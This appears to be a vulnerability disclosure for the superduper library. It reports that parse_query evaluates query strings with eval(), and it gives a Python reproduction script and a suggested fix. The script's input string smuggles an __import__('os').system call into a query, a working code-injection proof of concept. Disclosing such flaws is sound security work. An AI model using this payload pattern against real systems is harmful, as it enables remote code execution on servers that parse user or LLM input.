## Reproduction

This vulnerability is caused by the component parse_query, leading to arbitrary code execution. When external LLM users' input is controllable, or under other circumstances where it can be controlled, arbitrary code execution can be performed without any other conditions. ...

To reproduce this vuln, you can simply run this script with your own setup:

```python
from superduper import superduper
from superduper.base.query import parse_query
from superduper.components.table import Table
#Using SQLite as an example, the existence of this vulnerability is related to the choice of ...
# You need to create the db file at an absolute path yourself first.
db = superduper('sqlite:////xxx/xxx/xxx/mydatabase.db', initialize_cluster=False)
db.apply(
    Table(
        identifier="docs",
        fields={
            "text": "str",
            "type": "str",
        },
    )
)
db['docs'].insert([
    {'text': 'Hello World', 'type': 'greeting'},
    {'text': 'SuperDuper', 'type': 'framework'}
])

def process_input(user_input: str):
    """Process user input: query or conversation"""

    query = parse_query(user_input, documents=[], db=db)
    results = query.execute()
    print(f"[MAIN] query results: {results}")
    return f"Query results: {results}"

if __name__ == "__main__":
    out = process_input('db["x"] == __import__("os").system("ls /")')
    print(out)
```

Command execution result：
<img width="979" height="318" alt="Image" src="https://github.com/user-attachments/assets/535be250-4763-414a-b215-db7126838887" />

## Suggestion

Replace eval() with a safe parser or AST-based evaluation that restricts execution to allowed operations. Add input sanitization to prevent injection of dangerous code.

## Root Cause

This vuln is caused by parse_query in superduper/base/query.py, which uses eval() to parse query strings without proper sandboxing or restrictions.

## Real World Impact

The query strings are often constructed from user inputs or LLM outputs, so malicious inputs may lead to remote code execution when the system is running in a server environment.
